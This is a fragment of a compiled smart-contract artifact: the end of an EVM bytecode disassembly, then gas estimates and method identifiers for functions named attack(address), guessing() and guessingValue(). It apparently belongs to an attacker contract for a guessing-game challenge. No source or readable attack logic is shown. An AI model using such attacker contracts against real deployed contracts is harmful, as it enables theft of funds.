SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x37C DUP3 PUSH2 0x1EF JUMP JUMPDEST SWAP2 POP PUSH2 0x387 DUP4 PUSH2 0x1EF JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x397 JUMPI PUSH2 0x396 PUSH2 0x342 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xE8 0x27 COINBASE PUSH32 0x1A4A571DDEBB4359014A6F54CC9B0C0E95FB807172F37979F73689F764736F6C PUSH4 0x4300080D STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "196800",
						"executionCost": "238",
						"totalCost": "197038"
					},
					"external": {
						"attack(address)": "infinite",
						"guessing()": "2471",
						"guessingValue()": "2407"
					}
				},
				"methodIdentifiers": {
					"attack(address)": "d018db3e",
					"guessing()": "79e41b39",
					"guessingValue()": "3fe6dd29"
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}